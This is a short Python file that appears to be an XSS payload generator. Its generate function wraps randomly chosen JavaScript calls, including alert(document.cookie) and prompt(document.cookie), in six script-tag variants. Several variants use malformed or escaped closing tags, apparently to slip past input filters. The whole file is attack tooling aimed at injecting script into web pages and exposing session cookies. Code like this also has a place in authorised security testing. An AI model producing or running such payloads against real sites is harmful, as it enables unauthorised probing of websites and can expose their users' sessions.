from random import randint


def generate(eff):
    FUNCTION = [
        "prompt(5000/200)",
        "alert(6000/3000)",
        "alert(document.cookie)",
        "prompt(document.cookie)",
        "console.log(5000/3000)"
    ]

    if eff == 1:
        return "<script/>" + FUNCTION[randint(0, 4)] + "<\script\>"

    elif eff == 2:
        return "<\script/>" + FUNCTION[randint(0, 4)] + "<\\script>"

    elif eff == 3:
        return "<\script\> " + FUNCTION[randint(0, 4)] + "<//script>"

    elif eff == 4:
        return "<script>" + FUNCTION[randint(0, 4)] + "<\script/>"

    elif eff == 5:
        return "<script>" + FUNCTION[randint(0, 4)] + "<//script>"

    elif eff == 6:
        return "<script>" + FUNCTION[randint(0, 4)] + "</script>"
